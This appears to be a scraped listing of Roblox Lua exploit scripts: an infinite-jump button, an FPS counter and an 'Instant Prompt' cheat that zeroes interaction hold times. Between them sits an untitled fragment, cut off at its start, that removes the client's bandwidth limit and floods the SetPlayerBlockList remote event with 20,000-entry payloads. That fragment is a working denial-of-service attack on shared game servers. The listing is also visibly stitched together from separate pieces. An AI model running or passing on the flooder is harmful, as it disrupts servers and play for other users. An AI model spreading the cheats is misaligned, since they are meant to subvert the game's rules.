scripts.title: Jump buttom (jumpindex)
scripts.script:
--[[
    jumpindex.lua
    - ∞ OFF: clicar ⬆ = 1 pulo normal (ChangeState + velocidade, sai de cadeira/carro)
    - ∞ ON: SEGURAR ⬆ = pula infinitamente / soltar = para
    - Botão ⬆ pisca azul claro ao clicar no OFF
    - Anti-spam: ignora clique se não estiver no chão
--]]

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local antiga = playerGui:FindFirstChild("BotaoPularGui")
if antiga then antiga:Destroy() end

------------------------------------------------------------
-- SCREEN GUI
------------------------------------------------------------
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "BotaoPularGui"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = false
screenGui.DisplayOrder = 999
screenGui.Parent = playerGui

------------------------------------------------------------
-- FRAME PAI
------------------------------------------------------------
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 60, 0, 90)
mainFrame.Position = UDim2.new(1, -80, 0, 20)
mainFrame.BackgroundTransparency = 1
mainFrame.Parent = screenGui

------------------------------------------------------------
-- BOTÃO ⬆
------------------------------------------------------------
local container = Instance.new("Frame")
container.Name = "ContainerBotao"
container.Size = UDim2.new(0, 50, 0, 50)
container.Position = UDim2.new(0, 5, 0, 0)
container.BackgroundColor3 = Color3.fromRGB(50, 130, 255)
container.BorderSizePixel = 0
container.Parent = mainFrame

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(1, 0)
corner.Parent = container

local gradient = Instance.new("UIGradient")
gradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 160, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 80, 200))
})
gradient.Rotation = 90
gradient.Parent = container

local botao = Instance.new("TextButton")
botao.Name = "BtnPular"
botao.Size = UDim2.new(1, 0, 1, 0)
botao.BackgroundTransparency = 1
botao.Text = "⬆"
botao.TextColor3 = Color3.fromRGB(255, 255, 255)
botao.TextScaled = true
botao.Font = Enum.Font.GothamBold
botao.AutoButtonColor = false
botao.Active = true
botao.Parent = container

local textSize = Instance.new("UITextSizeConstraint")
textSize.MaxTextSize = 30
textSize.Parent = botao

------------------------------------------------------------
-- TOGGLE ∞
------------------------------------------------------------
local toggleContainer = Instance.new("Frame")
toggleContainer.Name = "ContainerToggle"
toggleContainer.Size = UDim2.new(0, 50, 0, 22)
toggleContainer.Position = UDim2.new(0, 5, 0, 60)
toggleContainer.BackgroundColor3 = Color3.fromRGB(35, 45, 65)
toggleContainer.BorderSizePixel = 0
toggleContainer.Parent = mainFrame

local toggleCorner = Instance.new("UICorner")
toggleCorner.CornerRadius = UDim.new(0, 6)
toggleCorner.Parent = toggleContainer

local toggleBtn = Instance.new("TextButton")
toggleBtn.Name = "BtnToggle"
toggleBtn.Size = UDim2.new(1, 0, 1, 0)
toggleBtn.BackgroundTransparency = 1
toggleBtn.Text = "∞ OFF"
toggleBtn.TextColor3 = Color3.fromRGB(180, 200, 230)
toggleBtn.TextScaled = true
toggleBtn.Font = Enum.Font.GothamBold
toggleBtn.AutoButtonColor = false
toggleBtn.Active = true
toggleBtn.Parent = toggleContainer

local toggleTextSize = Instance.new("UITextSizeConstraint")
toggleTextSize.MaxTextSize = 13
toggleTextSize.Parent = toggleBtn

------------------------------------------------------------
-- CORES
------------------------------------------------------------
local COR_AZUL_NORMAL = Color3.fromRGB(50, 130, 255)
local COR_AZUL_CLARO  = Color3.fromRGB(200, 230, 255)
local COR_VERDE_ARM   = Color3.fromRGB(40, 110, 70)
local COR_VERDE_ATIVO = Color3.fromRGB(80, 220, 120)

local GRAD_NORMAL = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 160, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 80, 200))
})
local GRAD_CLARO = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(200, 230, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 230, 255))
})
local GRAD_ARM = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(60, 160, 100)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 80, 50))
})
local GRAD_ATIVO = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(120, 255, 160)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 140, 60))
})

------------------------------------------------------------
-- ESTADOS
------------------------------------------------------------
local infiniteArmado = false
local segurando      = false
local loopRodando    = false
local piscando       = false
local FORCA_PULO     = 50

------------------------------------------------------------
-- VISUAIS
------------------------------------------------------------
local function atualizarToggle()
    if infiniteArmado then
        toggleBtn.Text = "∞ ON"
        toggleBtn.TextColor3 = Color3.fromRGB(120, 255, 160)
        toggleContainer.BackgroundColor3 = Color3.fromRGB(25, 70, 40)
    else
        toggleBtn.Text = "∞ OFF"
        toggleBtn.TextColor3 = Color3.fromRGB(180, 200, 230)
        toggleContainer.BackgroundColor3 = Color3.fromRGB(35, 45, 65)
    end
end

local function atualizarVisualBotao()
    if piscando then return end

    if segurando then
        container.BackgroundColor3 = COR_VERDE_ATIVO
        gradient.Color = GRAD_ATIVO
    elseif infiniteArmado then
        container.BackgroundColor3 = COR_VERDE_ARM
        gradient.Color = GRAD_ARM
    else
        container.BackgroundColor3 = COR_AZUL_NORMAL
        gradient.Color = GRAD_NORMAL
    end
end

------------------------------------------------------------
-- PISCA AZUL CLARO
------------------------------------------------------------
local function piscarAzulClaro()
    piscando = true
    container.BackgroundColor3 = COR_AZUL_CLARO
    gradient.Color = GRAD_CLARO

    task.spawn(function()
        task.wait(0.15)
        piscando = false
        atualizarVisualBotao()
    end)
end

------------------------------------------------------------
-- CHECA SE ESTÁ NO CHÃO
------------------------------------------------------------
local function estaNoChao(humanoid)
    local estado = humanoid:GetState()
    if estado == Enum.HumanoidStateType.Jumping
    or estado == Enum.HumanoidStateType.Freefall then
        return false
    end
    if humanoid.FloorMaterial == Enum.Material.Air then
        return false
    end
    return true
end

------------------------------------------------------------
-- APLICA PULO (ChangeState + velocidade)
------------------------------------------------------------
local function aplicarPulo()
    local character = player.Character
    if not character then return end

    local humanoid = character:FindFirstChildOfClass("Humanoid")
    local hrp = character:FindFirstChild("HumanoidRootPart")
    if not humanoid or not hrp then return end

    pcall(function()
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
    end)

    local vel = hrp.AssemblyLinearVelocity
    hrp.AssemblyLinearVelocity = Vector3.new(vel.X, FORCA_PULO, vel.Z)
end

------------------------------------------------------------
-- PULO NORMAL (com debounce real)
------------------------------------------------------------
local ultimoPulo = 0
local COOLDOWN = 0.35

local function pularNormal()
    local agora = tick()
    if agora - ultimoPulo < COOLDOWN then return end

    local character = player.Character
    if not character then return end

    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end

    -- Se está sentado (cadeira/carro), levanta e pula depois
    if humanoid.Sit then
        ultimoPulo = agora
        pcall(function()
            humanoid.Sit = false
        end)
        task.spawn(function()
            task.wait(0.08)
            local char = player.Character
            if not char then return end
            local hum = char:FindFirstChildOfClass("Humanoid")
            if not hum then return end
            if estaNoChao(hum) then
                aplicarPulo()
            end
        end)
        return
    end

    -- Só pula se estiver no chão (evita spam e voo no OFF)
    if not estaNoChao(humanoid) then return end

    ultimoPulo = agora
    aplicarPulo()
end

------------------------------------------------------------
-- LOOP DO INFINITE
------------------------------------------------------------
local function loopInfinite()
    if loopRodando then return end
    loopRodando = true

    task.spawn(function()
        while segurando and infiniteArmado do
            local character = player.Character
            if character then
                local humanoid = character:FindFirstChildOfClass("Humanoid")
                local hrp = character:FindFirstChild("HumanoidRootPart")
                if humanoid and hrp then
                    pcall(function()
                        if humanoid.Sit then
                            humanoid.Sit = false
                        end
                    end)
                    pcall(function()
                        humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
                        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                    end)
                    local vel = hrp.AssemblyLinearVelocity
                    hrp.AssemblyLinearVelocity = Vector3.new(vel.X, FORCA_PULO, vel.Z)
                end
            end
            task.wait(0.05)
        end
        loopRodando = false
    end)
end

------------------------------------------------------------
-- TOGGLE
------------------------------------------------------------
toggleBtn.MouseButton1Click:Connect(function()
    infiniteArmado = not infiniteArmado
    if not infiniteArmado then
        segurando = false
    end
    atualizarToggle()
    atualizarVisualBotao()
end)

------------------------------------------------------------
-- INPUT DO BOTÃO ⬆
------------------------------------------------------------
local function aoPressionar()
    if infiniteArmado then
        segurando = true
        atualizarVisualBotao()
        loopInfinite()
    else
        piscarAzulClaro()
        pularNormal()
    end
end

local function aoSoltar()
    if segurando then
        segurando = false
        atualizarVisualBotao()
    end
end

botao.MouseButton1Down:Connect(aoPressionar)
botao.MouseButton1Up:Connect(aoSoltar)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1
    or input.UserInputType == Enum.UserInputType.Touch then
        aoSoltar()
    end
end)

------------------------------------------------------------
-- INICIALIZAR
------------------------------------------------------------
atualizarToggle()
atualizarVisualBotao()
print("[jumpindex] Carregado!")

scripts.script:
-- FPS Counter Mobile
-- Contador visual no canto superior direito

local RunService = game:GetService("RunService")
local Players = game:GetService("Players")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Evita duplicar o contador
local old = playerGui:FindFirstChild("FPSCounter")
if old then
    old:Destroy()
end

local gui = Instance.new("ScreenGui")
gui.Name = "FPSCounter"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.Parent = playerGui

local label = Instance.new("TextLabel")
label.Name = "FPSLabel"
label.Size = UDim2.new(0, 145, 0, 38)
label.Position = UDim2.new(1, -155, 0, 12)
label.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
label.BackgroundTransparency = 0.2
label.BorderSizePixel = 0
label.TextColor3 = Color3.fromRGB(0, 255, 100)
label.TextSize = 18
label.Font = Enum.Font.GothamBold
label.Text = "FPS: calculando..."
label.Parent = gui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 8)
corner.Parent = label

local frames = 0
local elapsed = 0

RunService.RenderStepped:Connect(function(dt)
    frames = frames + 1
    elapsed = elapsed + dt

    if elapsed >= 0.5 then
        local fps = math.floor(frames / elapsed + 0.5)

        label.Text = "FPS: " .. fps

        if fps >= 50 then
            label.TextColor3 = Color3.fromRGB(0, 255, 100)
        elseif fps >= 30 then
            label.TextColor3 = Color3.fromRGB(255, 200, 0)
        else
            label.TextColor3 = Color3.fromRGB(255, 75, 75)
        end

        frames = 0
        elapsed = 0
    end
end)

print("FPS Counter ativado!")

    return TweenService:Create(i, TweenInfo.new(d or 0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), p)
end

-- ─── spam state ─────────────────────────────────────────────
local Spam = {
    Enabled = false, Running = false, Building = false,
    FireBurst = 1, FrameDelay = 0.1,
    Children = 20000, NestedPerChild = 0, FieldsPerChild = 1, FieldSize = 0,
    RebuildEach = false, FireCount = 0,
    Remote = nil, Cache = nil, Thread = nil, Pad = "",
    SessionStart = nil, NullSince = nil, LastResult = nil,
}

pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge) end)

local function resolveRemote()
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if not rrs then return nil end
    local r = rrs:FindFirstChild("SetPlayerBlockList")
    if r and (r:IsA("RemoteEvent") or r:IsA("UnreliableRemoteEvent")) then return r end
    return nil
end
Spam.Remote = resolveRemote()

local function rebuildPad()
    Spam.Pad = Spam.FieldSize > 0 and string.rep("P", Spam.FieldSize) or ""
end
rebuildPad()

local function buildPayload()
    local n = Spam.Children
    local fields = Spam.FieldsPerChild
    local nested = Spam.NestedPerChild
    local pad = Spam.Pad or ""
    local usePad = Spam.FieldSize > 0
    local root = table.create(n)
    for i = 1, n do
        local entry = { id = i, v = i * 2 }
        for k = 1, fields do
            entry["k" .. k] = usePad and pad or (i + k)
        end
        for j = 1, nested do
            entry["n" .. j] = { a = i, b = j }
        end
        root[i] = entry
    end
    return root
end

local function fireN(remote, payload, n)
    for i = 1, n do
        remote:FireServer(payload)
    end
end

local worker
worker = function()
    while Spam.Running do
        if not Spam.Remote then Spam.Remote = resolveRemote() end
        local cache = Spam.Cache
        local remote = Spam.Remote
        if remote and cache then
            local n = Spam.FireBurst
            local ok = pcall(fireN, remote, cache, n)
            if ok then
                Spam.FireCount = Spam.FireCount + n
            else
                Spam.Remote = nil
            end
        end
        if Spam.FrameDelay > 0 then task.wait(Spam.FrameDelay) else RunService.Heartbeat:Wait() end
    end
end

local function ensureCacheThenStart()
    if Spam.Building then return end
    if Spam.Cache then
        Spam.Enabled = true
        if not Spam.Running then
            Spam.Running = true
            Spam.SessionStart = tick()
            Spam.LastResult = nil
            Spam.Thread = task.spawn(worker)
        end
        return
    end
    Spam.Building = true
    Spam.Enabled = true
    task.spawn(function()
        local snapC, snapN, snapF, snapS = Spam.Children, Spam.NestedPerChild, Spam.FieldsPerChild, Spam.FieldSize
        rebuildPad()
        local ok, payload = pcall(buildPayload)
        Spam.Building = false
        if not ok or not payload then Spam.Enabled = false; return end
        if not Spam.Enabled then return end
        if Spam.Children ~= snapC or Spam.NestedPerChild ~= snapN or Spam.FieldsPerChild ~= snapF or Spam.FieldSize ~= snapS then
            ensureCacheThenStart(); return
        end
        Spam.Cache = payload
        if not Spam.Running then
            Spam.Running = true
            Spam.SessionStart = tick()
            Spam.LastResult = nil
            Spam.Thread = task.spawn(worker)
        end
    end)
end

local function stopSpam()
    Spam.Enabled = false
    Spam.Running = false
    Spam.Thread = nil
end

scripts.title: Instant Prompt
scripts.script:
-- Inicialização da Interface Eleganete e Leve
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local ProximityPromptService = game:GetService("ProximityPromptService")
local TweenService = game:GetService("TweenService")

local localPlayer = Players.LocalPlayer

-- Evita duplicar o Hub caso execute duas vezes
if CoreGui:FindFirstChild("InstantPromptHub") then
CoreGui.InstantPromptHub:Destroy()
end

-- Estado das funções
local hackAtivo = false
local minimizado = false
local conexaoPrompt = nil
local conexoesOriginais = {}

-- Criação da GUI Principal
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "InstantPromptHub"
ScreenGui.Parent = CoreGui
ScreenGui.ResetOnSpawn = false

-- Janela Principal (Main Frame)
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 220, 0, 130)
MainFrame.Position = UDim2.new(0.5, -110, 0.4, -65)
MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true -- Permite arrastar a janela pela tela
MainFrame.Parent = ScreenGui

local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 8)
MainCorner.Parent = MainFrame

-- Barra de Título
local TitleBar = Instance.new("TextLabel")
TitleBar.Name = "TitleBar"
TitleBar.Size = UDim2.new(1, -40, 0, 30)
TitleBar.Position = UDim2.new(0, 10, 0, 0)
TitleBar.BackgroundTransparency = 1
TitleBar.Text = "Instant Prompt Hub"
TitleBar.TextColor3 = Color3.fromRGB(240, 240, 240)
TitleBar.TextSize = 14
TitleBar.Font = Enum.Font.SourceSansBold
TitleBar.TextXAlignment = Enum.TextXAlignment.Left
TitleBar.Parent = MainFrame

-- Botão Minimizar/Maximizar
local MinBtn = Instance.new("TextButton")
MinBtn.Name = "MinBtn"
MinBtn.Size = UDim2.new(0, 25, 0, 25)
MinBtn.Position = UDim2.new(1, -30, 0, 3)
MinBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
MinBtn.Text = "-"
MinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
MinBtn.TextSize = 16
MinBtn.Font = Enum.Font.SourceSansBold
MinBtn.Parent = MainFrame

local MinCorner = Instance.new("UICorner")
MinCorner.CornerRadius = UDim.new(0, 5)
MinCorner.Parent = MinBtn

-- Botão Ligar / Desligar (Toggle)
local ToggleBtn = Instance.new("TextButton")
ToggleBtn.Name = "ToggleBtn"
ToggleBtn.Size = UDim2.new(1, -20, 0, 40)
ToggleBtn.Position = UDim2.new(0, 10, 0, 45)
ToggleBtn.BackgroundColor3 = Color3.fromRGB(180, 50, 50) -- Começa vermelho (Desativado)
ToggleBtn.Text = "STATUS: DESATIVADO"
ToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ToggleBtn.TextSize = 14
ToggleBtn.Font = Enum.Font.SourceSansBold
ToggleBtn.Parent = MainFrame

local ToggleCorner = Instance.new("UICorner")
ToggleCorner.CornerRadius = UDim.new(0, 6)
ToggleCorner.Parent = ToggleBtn

-- Créditos pequenos na parte inferior
local Credits = Instance.new("TextLabel")
Credits.Size = UDim2.new(1, 0, 0, 20)
Credits.Position = UDim2.new(0, 0, 1, -22)
Credits.BackgroundTransparency = 1
Credits.Text = "v1.0 • Desenvolvido por grennred9"
Credits.TextColor3 = Color3.fromRGB(120, 120, 140)
Credits.TextSize = 11
Credits.Font = Enum.Font.SourceSans
Credits.Parent = MainFrame

--- =========================================================
--- Lógica de Funcionamento do Hack (ProximityPrompt)
--- =========================================================

local function forcarZerar(prompt)
if prompt:IsA("ProximityPrompt") and hackAtivo then
-- Salva a duração original para poder restaurar depois se desligar
if not conexoesOriginais[prompt] then
conexoesOriginais[prompt] = prompt.HoldDuration
end
prompt.HoldDuration = 0
end
end

local function ativarHack()
hackAtivo = true
ToggleBtn.BackgroundColor3 = Color3.fromRGB(50, 150, 50) -- Verde
ToggleBtn.Text = "STATUS: ATIVADO"

-- Zera todos os atuais do mapa
for _, prompt in ipairs(game:GetDescendants()) do
forcarZerar(prompt)
end

-- Fica monitorando novos que aparecem
conexaoPrompt = ProximityPromptService.PromptShown:Connect(forcarZerar)
end

local function desativarHack()
hackAtivo = false
ToggleBtn.BackgroundColor3 = Color3.fromRGB(180, 50, 50) -- Vermelho
ToggleBtn.Text = "STATUS: DESATIVADO"

-- Desconecta o monitoramento de novos prompts
if conexaoPrompt then
conexaoPrompt:Disconnect()
conexaoPrompt = nil
end

-- Restaura a duração original dos prompts existentes
for prompt, duracaoOriginal in pairs(conexoesOriginais) do
if prompt and prompt.Parent then
prompt.HoldDuration = duracaoOriginal
end
end
conexoesOriginais = {}
end

-- Clique no Botão Ligar/Desligar
ToggleBtn.MouseButton1Click:Connect(function()
if hackAtivo then
desativarHack()
else
ativarHack()
end
end)

-- Clique no Botão Minimizar
MinBtn.MouseButton1Click:Connect(function()
if minimizado then
-- Maximiza
TweenService:Create(MainFrame, TweenInfo.new(0.3), {Size = UDim2.new(0, 220, 0, 130)}):Play()
ToggleBtn.Visible = true
Credits.Visible = true
MinBtn.Text = "-"
minimizado = false
else
-- Minimiza (deixa apenas a barra de título visível)
ToggleBtn.Visible = false
Credits.Visible = false
TweenService:Create(MainFrame, TweenInfo.new(0.3), {Size = UDim2.new(0, 220, 0, 30)}):Play()
MinBtn.Text = "+"
minimizado = true
end
end)
scripts.features:
- Sleek & Lightweight GUI
- ON / OFF Status Toggle (Enables/Disables instantly)
- Minimize and Maximize button (+) / (-)
- Draggable Window (Move it anywhere on screen)
- Restores original prompt duration when turned OFF
